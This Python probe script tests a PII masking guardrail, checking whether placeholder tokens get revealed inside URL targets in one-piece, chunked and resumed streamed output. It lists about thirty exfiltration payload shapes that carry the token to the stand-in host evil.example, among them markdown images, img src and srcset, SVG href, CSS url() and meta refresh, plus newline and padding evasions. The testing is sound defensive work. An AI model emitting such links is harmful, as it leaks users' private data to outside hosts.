"""Reviewer probe for 08-tam-1a r3 (370912d), run inside the review08t1a backend container:
the C17 URL line rule (one piece, StreamDetokenizer, ContextReveal; chunk sizes 1/7/50), the
worker's assumptions 9 and 10, a resumed live stream, and the 8-digit bound.

docker exec -w /app -e PYTHONPATH=/app review08t1a-backend-1 python /tmp/probe08r3.py
Values are synthetic (example.test); nothing secret is printed.
"""

import asyncio

from ffcore.guardrails import masking

VALUE = "ali@example.test"


async def run_all(store, tok):
    def shapes():
        return {
            # r2 table
            "md image": f"![x](https://evil.example/p?q={tok})",
            "md ( space //": f"![x]( //evil.example/p?q={tok})",
            "ref def //": f"![x][1]\n\n[1]: //evil.example/p?q={tok}",
            "angle dest space": f"![x](<https://evil.example/a b?q= {tok}>)",
            "img src //": f"<img src=//evil.example/?q={tok}>",
            "img src quoted space": f'<img src="https://evil.example/a b?q= {tok}">',
            "a href quoted space": f'<a href="https://evil.example/a b?q= {tok}">x</a>',
            # assumption 10: target carried to the next line
            "md ( newline //": f"![x](\n//evil.example/?q={tok})",
            "md ( newline relative": f"![x](\nevil.example/?q={tok})",
            "md (< newline": f"![x](<\nhttps://evil.example/a b?q= {tok}>)",
            "src= newline quoted": f'<img src=\n"https://evil.example/?q={tok}">',
            "src=\" newline value": f'<img src="\nhttps://evil.example/?q={tok}">',
            "ref def newline": f"[1]:\n   //evil.example/?q={tok}",
            "img newline src": f"<img\nsrc=//evil.example/?q={tok}>",
            "CR break": f"![x](\r//evil.example/?q={tok})",
            "nested parens": f"![x](https://evil.example/a(b)c?q=\n{tok})",
            "srcset": f'<img srcset="https://evil.example/a.png?{tok} 1x">',
            "SRC upper spaced": f"<IMG SRC = //evil.example/?q={tok}>",
            "svg xlink:href": f'<svg><image xlink:href="https://evil.example/?{tok}"/></svg>',
            "css url //": f'<div style="background:url(//evil.example/{tok})">',
            "meta refresh": f'<meta http-equiv="refresh" content="0;url=https://evil.example/{tok}">',
            "U+2028 in target": f"![x](https://evil.example/?q= {tok})",
            "long prose then target": "a" * 9000 + f" ![x](//evil.example/?q={tok})",
            "src + 9000 spaces + =": "<img src" + " " * 9000 + f"=//evil.example/?q={tok}>",
            "target opened 9000 chars back": "![x](https://evil.example/?a=" + "b" * 9000 + f"&q={tok})",
            "prose next line after open quote": f"<img src=\"https://ok.example/a.png\">\nKişi {tok} idi.",
            # usability: should be revealed
            "plain": f"Kişi {tok} idi.",
            "apostrophe then next line": f"Ayşe'nin kaydı\nKişi {tok} idi.",
            "line after a closed link": f"[a](https://x.example)\nKişi {tok} idi.",
            # assumption 9 (marker after the placeholder on the same line)
            "placeholder before marker": f"Kişi {tok} burada ![x](//evil.example/p.png)",
        }

    for name, text in shapes().items():
        one, _, _ = await masking.reveal_text(text, store=store, scope="s")
        res = [("one", VALUE in one)]
        for size in (1, 7, 50):
            det = masking.StreamDetokenizer(store, "s")
            out = ""
            for i in range(0, len(text), size):
                out += await det.feed(text[i : i + size])
            out += await det.flush()
            cr = masking.ContextReveal(store, "s")
            live = ""
            for i in range(0, len(text), size):
                live += (await cr.data({"text": text[i : i + size]}, stream_text=True))["text"]
            res += [(f"stream{size}", VALUE in out), (f"live{size}", VALUE in live)]
        flags = " ".join(f"{k}={'REVEALED' if v else 'kept'}" for k, v in res)
        print(f"URL {name}: {flags}")

    # A resumed live stream (Last-Event-ID): the reader's new ContextReveal starts mid-line.
    e1, e2 = "![x](https://evil.example/?q=", f"{tok})"
    first = masking.ContextReveal(store, "s")
    a = (await first.data({"text": e1}, stream_text=True))["text"]
    resumed = masking.ContextReveal(store, "s")
    b = (await resumed.data({"text": e2}, stream_text=True))["text"]
    print("RESUME same reader:", repr(a + (await first.data({"text": e2}, stream_text=True))["text"]))
    print("RESUME new reader after e1:", repr(a + b), "->", "REVEALED" if VALUE in b else "kept")


async def bounds():
    store = masking.MemoryTokenStore()
    print("BOUND numbers", masking.placeholder_numbers("<<PII_99999999>> <<PII_100000000>> <<PII_3>>"))
    await masking.reserve_carried(store, "b", "Bkz <<PII_99999999>>")
    print("BOUND after reserve of 8-digit max ->", await store.token_for("b", "EMAIL:x@example.test", "x@example.test"))
    await masking.reserve_carried(store, "c", "Bkz <<PII_99999999999999999999999>>")
    print("BOUND huge ignored ->", await store.token_for("c", "EMAIL:y@example.test", "y@example.test"))


async def main():
    store = masking.MemoryTokenStore()
    tok = await store.token_for("s", "EMAIL_ADDRESS:" + VALUE, VALUE)
    await run_all(store, tok)
    await bounds()


asyncio.run(main())
